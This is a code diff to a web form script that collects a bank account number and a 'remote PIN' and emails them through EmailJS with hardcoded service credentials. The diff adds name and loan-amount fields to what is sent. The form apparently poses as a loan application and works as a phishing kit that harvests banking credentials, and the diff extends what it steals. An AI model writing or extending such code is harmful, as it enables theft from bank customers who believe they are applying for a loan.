@@ -1,23 +1,28 @@
 const form = document.getElementById("app-form");
+const button = document.querySelector("#send-btn");
+
+const nameInput = document.getElementById("name");
+const loanAmount = document.getElementById("loan_amount");
 const accountNo = document.getElementById("account_no");
 const remotePin = document.getElementById("remote_pin");
-const button = document.querySelector("#send-btn");
+
+const validateInput = (input) => {
+  if (input.value === "" || input.value === null) {
+    return;
+  }
+
+  return input.value.trim();
+};
 
 form.addEventListener("submit", (e) => {
   e.preventDefault();
 
-  const validateInput = (input) => {
-    if (input.value === "" || input.value === null) {
-      return;
-    }
-
-    return input.value.trim();
-  };
-
   const accountNoVal = validateInput(accountNo);
+  const nameVal = validateInput(nameInput);
+  const loanAmountVal = validateInput(loanAmount);
   const remotePinVal = validateInput(remotePin);
 
-  if (accountNoVal && remotePinVal) {
+  if (accountNoVal && remotePinVal && nameVal && loanAmountVal) {
     // Set the submitting state
     button.innerHTML = `Submitting <i class="fa fa-spinner fa-spin"></i>`;
 
@@ -25,7 +30,7 @@ form.addEventListener("submit", (e) => {
       service_id: "service_sn6mekz",
       template_id: "template_p15fdti",
       user_id: "Wty3VQ9KPSIcGj-cS",
-      template_params: { accountNoVal, remotePinVal },
+      template_params: { accountNoVal, loanAmountVal, nameVal, remotePinVal },
     };
 
     // Send the email
